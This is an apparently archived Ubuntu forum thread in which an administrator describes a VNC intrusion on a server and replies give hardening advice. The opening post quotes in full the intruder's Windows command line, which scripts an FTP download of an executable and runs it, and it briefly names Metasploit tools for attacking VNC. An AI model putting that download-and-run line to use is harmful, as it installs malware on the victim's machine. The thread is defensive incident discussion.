---
title: "Unwanted Remote Desktop Access"
date: 2014-01-05
forum: Security
---

### Post by saozumin on 2014-01-05
We have a UBUNTU 12.04 server in our company, which is remotely administered using Putty/ssh and TightVNC. 
One  day we realized an intruder had got a GUI login to the server, and was  able to control the mouse to configure the Remote Desktop settings. A  terminal window was also open and the following command was entered into  it:- 

“%systemroot%\system32\cmd.exe
del eq&echo open 0.0.0.0 13643 >> eq &echo user 13302 30046 >> eq &echo get mswinsvcr.exe >> eq &echo quit >> eq &ftp -n -s:eq & mswinsvcr.exe &del eq”

  3. There are three ways to exploit the VNC service withmetasploit:- 
    i) msfpayload generated exe  :- when executed on a windows machine then a remote desktop session can  be initiated. But in our case this is a Linux machine so it is ruled  out.
   ii) mallicious link generated with SET – Browsing the link, results in a VNC session. This is also ruled out as no one has browsed any such links from the server.
   iii) vnc_login auxillary module of metasploit.  An exhaustive password list is required. In our case we are using a  strong alpha numeric password which is difficult to guess using  dictionary attack.
 
  I have the following questions:- 

First what does the command mentioned above exactly do on a linux machine ? 
How can a person get a remote GUI log in into a Ubuntu machine without knowing the credentials. 
 
Thanks in advance

---

### Post by TheFu on 2014-01-06
1. I don't know. Looks like they are running an MS-Windows command on Linux, so it shouldn't do anything.
2. VNC doesn't use any encryption by default. A VPN is needed to secure that connection. Not all VPNs are created equal. PPTP has had flaws that are well known AND exploited in the wild.  OpenVPN is the best choice for this.

VNC has a number of flaws and shouldn't be available over the internet - PERIOD.

Use key-based ssh credentials (not passwords) and if you must have a remote desktop, use NX (which uses ssh) OR setup a real VPN and tunnel all traffic through that single interface.

If your ssh allows passwords, you've already failed.  Only allow key-based connections AND monitor AND block failed attempts using something like **denyhosts** or **fail2ban**.

Oh ... and fire whoever setup VNC without any security.   While you are at it, fire the network admin who opened the port allowing VNC to work. If both these roles are performed by a single person, rework your IT department. That is a fatal flaw.

---

### Post by CharlesA on 2014-01-06
I think TheFu covered the main things, but I would be more concerned with running VNC on a production server. You discovered this failed hack attempt, but how do you know your system wasn't accessed previously? The attack above was only noticed because it was written for a windows machine, and wouldn't run on a  *nix box.

There is no way I would run VNC on a server, even if I needed a desktop for whatever reason. NX wins over VNC because it tunnels everything over SSH, which is encrypted, where normal VNC traffic is unencrypted, which is a huge "nono" as far as remote access goes.

Oh, and +1 to OpenVPN.

Personally, I would restore the machine from backups, only install SSH and use keys instead of passwords for authentication. What were you using the GUI for on the server?

---

### Post by houstonbofh on 2014-01-11
I too would ditch VNC, and just have ssh access.  If you type "ssh -X user@server" you can launch GUI applications on your local desktop as well.

---

